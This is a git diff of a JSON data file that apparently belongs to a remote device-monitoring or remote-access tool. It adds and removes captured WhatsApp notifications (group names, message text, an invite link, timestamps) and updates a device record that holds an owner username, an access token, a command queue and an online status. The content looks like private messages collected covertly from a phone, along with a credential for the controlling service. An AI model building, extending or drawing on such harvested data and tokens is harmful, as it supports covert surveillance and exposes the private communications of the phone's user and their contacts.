@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (194 pesan): ~ Malkzz",
+        "content": "💟 Stiker",
+        "time": "30/04 06:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777501583232
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝗣𝗔𝗦𝗨𝗞𝗔𝗡 𝗣𝗘𝗡𝗚𝗛𝗬𝗧𝗔𝗠𝗔𝗡 (160 pesan): ~ paees nak tido",
+        "content": "🔗 NGAWI CLUB | Buka tautan ini untuk bergabung ke grup WhatsApp saya: https://chat.whatsapp.com/FtXYc0B6Z9a8BaEFnCtpt4?mode=gi_t",
+        "time": "30/04 06:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777501583211
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎2631 pesan dari 17 chat",
         "time": "30/04 06:37",
@@ -4003,22 +4019,6 @@
         "time": "30/04 06:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1777500987012
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (7 pesan): ~ wanglin",
-        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
-        "time": "30/04 06:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777500986906
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (411 pesan): ~ ......",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "30/04 06:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777500986559
       }
     ],
     "galleryPhotos": [],
@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777501582425,
+    "lastSeen": 1777501588748,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
